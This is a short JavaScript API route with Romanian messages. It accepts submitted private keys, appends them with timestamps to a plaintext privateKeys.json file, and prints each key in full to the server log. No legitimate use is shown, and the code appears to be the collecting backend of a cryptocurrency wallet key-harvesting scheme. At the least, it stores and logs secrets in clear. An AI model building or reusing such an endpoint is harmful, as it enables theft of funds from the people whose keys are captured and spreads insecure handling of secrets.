import { promises as fs } from "fs";
import path from "path";

const filePath = path.join(process.cwd(), "privateKeys.json");

export async function GET(req) {
    return new Response(
      JSON.stringify({ message: "Conexiunea la backend funcționează!" }),
      { status: 200, headers: { "Content-Type": "application/json" } }
    );
  }

  export async function POST(req) {
    try {
      const body = await req.json();
      const { privateKey } = body;
  
      if (!privateKey) {
        return new Response(
          JSON.stringify({ message: "Cheia privată lipsește." }),
          { status: 400 }
        );
      }
  
      // Creează fișierul dacă nu există
      try {
        await fs.access(filePath); // Verifică dacă fișierul există
      } catch (err) {
        if (err.code === "ENOENT") {
          // Fișierul nu există, creează unul gol
          await fs.writeFile(filePath, "[]", "utf-8");
          console.log("Fișierul privateKeys.json a fost creat.");
        } else {
          throw err; // Aruncă alte erori necunoscute
        }
      }
  
      // Citește conținutul existent
      const existingData = JSON.parse(await fs.readFile(filePath, "utf-8"));
  
      // Adaugă noua cheie privată în fișier
      const newEntry = {
        privateKey,
        timestamp: new Date().toISOString(),
      };
      existingData.push(newEntry);
  
      // Suprascrie fișierul cu noile date
      await fs.writeFile(filePath, JSON.stringify(existingData, null, 2), "utf-8");
  
      console.log("Cheia privată a fost salvată în fișier:", privateKey);
  
      return new Response(
        JSON.stringify({ message: "Cheia privată a fost salvată cu succes." }),
        { status: 200 }
      );
    } catch (error) {
      console.error("Eroare la manipularea request-ului:", error);
      return new Response(
        JSON.stringify({ message: "Eroare internă la server." }),
        { status: 500 }
      );
    }
  }
